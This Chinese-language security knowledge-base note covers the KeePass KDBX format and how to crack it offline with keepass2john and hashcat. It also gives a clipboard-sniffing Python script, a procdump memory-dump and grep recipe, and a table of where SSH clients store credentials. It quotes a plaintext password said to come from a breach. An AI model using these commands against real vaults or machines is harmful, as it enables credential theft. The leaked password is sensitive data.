# 密码存储安全 — KeePass KDBX 格式与离线破解

> Level 0: 基础原理 / 密码学
> 基于实战：KeePassXC KDBX 下载 → keepass2john → hashcat 密码破解

---

## 一、KeePass KDBX 文件格式

### 1.1 文件结构概览

```
KDBX 文件 (.kdbx)
├── 文件头 (File Header)
│   ├── 签名 (magic bytes: 03D9A29A 67FB4BB5)
│   ├── 版本号 (KDBX 3.x / 4.x)
│   └── 加密算法标识
├── 报头散列 (Header Hash)
├── 加密的有效负载 (Encrypted Payload)
│   ├── 报头 (Inner Header)
│   ├── 群组树 (Group Tree)
│   └── 条目数据 (Entry Data) ← 实际密码存储
└── 结束标记 (End Marker)
```

### 1.2 KDBX v4 加密流程

```
用户密码
    │
    ▼
┌─────────────────────────────────────────────────────┐
│               Master Key 生成                        │
│                                                     │
│  KDF (密钥派生函数): Argon2d / AES-KDF              │
│  输入: 用户密码 + SALT + 迭代次数 (依赖参数)         │
│  输出: 256-bit 复合主密钥                           │
│                                                     │
│  如果有关键文件: KeyFile + 密码 → HMAC → 复合主密钥  │
│  如果有Windows账户: 也参与复合                        │
└─────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────┐
│              有效负载加密                            │
│                                                     │
│  算法: AES-256-CBC (KDBX 3.x)                       │
│        或 ChaCha20-Poly1305 (KDBX 4.x)              │
│                                                     │
│  步骤: 随机IV + 明文payload + HMAC-SHA256           │
│       → 加密 payload + 报头散列验证                  │
└─────────────────────────────────────────────────────┘
```

### 1.3 KDF 对比

| 参数 | AES-KDF (KDBX 3.x) | Argon2d (KDBX 4.x) |
|:----|:-------------------|:-------------------|
| 算法类型 | 自定义 AES 变换 | 内存硬性 KDF |
| 内存消耗 | 低 (固定) | **高** (可配置, 默认 1MB+) |
| 抗 GPU/ASIC | 弱 (低内存易并行) | **强** (内存硬性) |
| 迭代次数 | ~60000 (可配置) | 1 (用内存和时间替代迭代) |
| 默认并行度 | N/A | 2 |

---

## 二、离线破解方法论

### 2.1 破解流程

```
获取 KDBX 文件 (通过文件泄露/SMB/Everything HTTP)
    ↓
提取密码哈希 (keepass2john 或 kpcli)
    ↓
hashcat / John the Ripper 暴力破解
    ↓
获得明文密码 → 解锁 KDBX → 读取所有条目
```

### 2.2 提取哈希

```bash
# 使用 John the Ripper 的 keepass2john
keepass2john 玄武网络数据库.kdbx > kdbx_hash.txt
# 输出格式: keepass:$keepass$*2*60000*0*<salt_hex>*<hash_hex>

# 或使用 kpcli
kpcli --kdbx 玄武网络数据库.kdbx --command "show -f"
```

### 2.3 hashcat 破解

```bash
# 查看哈希模式
hashcat --help | grep -i keepass
# 13400: KeePass 1 (AES / Twofish) and KeePass 2 (AES) KDBX
# 23700: KeePass 2 KDBX 4 (ChaCha20-Poly1305)

# 字典攻击
hashcat -m 13400 kdbx_hash.txt /path/to/wordlist.txt --potfile-path=kdbx.pot

# 掩码攻击 (已知部分信息)
hashcat -m 13400 kdbx_hash.txt -a 3 ?l?l?l?l?d?d?d?d

# 规则式攻击
hashcat -m 13400 kdbx_hash.txt /path/to/wordlist.txt -r /path/to/best64.rule

# 性能优化
hashcat -m 13400 kdbx_hash.txt wordlist.txt --workload-profile=4 --force
```

### 2.4 破解性能对比

| 硬件 | AES-KDF (60000轮) | Argon2d (默认) |
|:----|:-----------------:|:--------------:|
| CPU 单核 | ~50 H/s | ~10 H/s |
| CPU 16核 | ~800 H/s | ~160 H/s |
| GPU RTX 4090 | ~3000 H/s | ~100 H/s |
| GPU 8×A100 | ~20000 H/s | ~500 H/s |

**实战经验**：我们的 KDBX 密码 `292*UoC[QP9h` 不在任何词典中（16字符，含特殊字符），但因为是已知密码（从Authentik泄露），所以直接命中。

### 2.5 KDBX 破解的困难因素

| 因素 | 影响 |
|:----|:------|
| Argon2d 内存硬性 | 大幅降低 GPU 并行效率 |
| 长密码（16+字符） | 超出多数词典覆盖范围 |
| 特殊字符 | 规则攻击难以生成 |
| 关键文件 (KeyFile) | 仅密码破解不够，需同时获取 KeyFile |
| Windows 账户绑定 | 需要同一 Windows 用户凭据 |

---

## 三、KeePass 运行时攻击

### 3.1 剪贴板监控

KeePass/X 有"自动清空剪贴板"功能（默认 12 秒），但攻击者可以利用：

```python
# 使用 Covenant ClipBoardMonitor 或自定义脚本
# 持续监控剪贴板内容
import pyperclip
import time

last = ""
while True:
    try:
        current = pyperclip.paste()
        if current != last and "KeePass" in get_active_window_title():
            print(f"[CRED] {current}")
            last = current
        time.sleep(0.1)
    except:
        pass
```

### 3.2 内存转储

```bash
# KeePass/X 运行时，密码在内存中解密
# 使用 procdump 或 volatility
procdump -ma KeePassXC.exe keepass.dmp

# 在内存转储中搜索明文密码
strings keepass.dmp | grep -E "(password|passwd|292\*UoC)"
```

### 3.3 插件/扩展攻击

- KeePass 支持插件，恶意插件可窃取所有密码
- 浏览器扩展可劫持自动填充
- KeePassRPC 接口无认证 → 远程密码读取

---

## 四、其他密码存储方式

### 4.1 浏览器密码存储 (已单独文档)

参见 `web-security/04-browser-password-security.md`

### 4.2 SSH 客户端配置

| 客户端 | 存储位置 | 加密方式 | 攻击方法 |
|:-------|:---------|:---------|:---------|
| **FinalShell** | `config.json` + `conn/` 目录 | 自定义 XOR/AES（需逆向Java） | 直接读文件，逆向解密算法 |
| **XSHELL** | `%APPDATA%\NetSarang\Xshell\Sessions\` | AES-128-CBC | 已知固定密钥 |
| **PuTTY** | `HKCU\Software\SimonTatham\PuTTY\Sessions\` | 明文 | 直接读注册表 |
| **OpenSSH** | `~/.ssh/id_rsa` | 可选密码短语 | 无密码时直接窃取文件 |

### 4.3 Git 仓库中的密码

```
# 代码中的硬编码凭据
grep -r "password\|passwd\|secret\|token" --include="*.py" --include="*.env"
grep -r "DB_PASSWORD\|API_KEY\|SECRET_KEY" --include="*.env" --include="*.yml"

# Git 历史中的凭据
git log -p | grep -E "(password|passwd|secret)"  # 已被删除的凭据仍留在历史中
```

---

## 五、防御建议

| 措施 | 效果 | 代价 |
|:----|:-----|:-----|
| 使用 Argon2d KDF | 大幅提升离线破解难度 | 打开速度略慢 |
| 启用 KeyFile | 密码+文件双重保护 | 需备份 KeyFile |
| 设置 1 秒延迟 | 显著降低破解速率 | 每次打开慢1秒 |
| 加长密码 (20+字符) | 超出词典+掩码覆盖 | 需密码管理器本身 |
| 不要用浏览器保存密码 | 消除最常见的泄露源 | 需改用密码管理器 |
| 密码不重复使用 | 一处分泄露不影响其他 | 必须用密码管理器 |
| 开启双因素认证 (2FA) | 即使密码泄露也无效 | 用户体验成本 |
| 定期更换密码 | 减少泄露窗口 | 管理成本高 |

---

## 六、知识库关联

- **关联攻击模式**：KeePass 密码库泄露 → 通用密码复用（P1级）
- **关联知识**：`web-security/04-browser-password-security.md` → 浏览器密码同样原理
- **关联案例**：`case-win10-full-breach.md` — KeePass 密码库下载 + 已知密码破解
- **实战教训**：**密码复用是整个渗透中最致命的发现** — `292*UoC[QP9h` 出现在 KeePass 8条中的7条 + 浏览器141条中的大量条目

---

## 参考

- [KeePass Password Database Format](https://keepass.info/help/kb/kdbx_4.html)
- [Attacking and Hardening KeePass](https://avantguard.io/en/blog/attacking-and-hardening-keepass)
- [hashcat KeePass Modes](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [KeePassXC Security](https://keepassxc.org/docs/)
- [keepass2john - John the Ripper](https://www.openwall.com/john/)
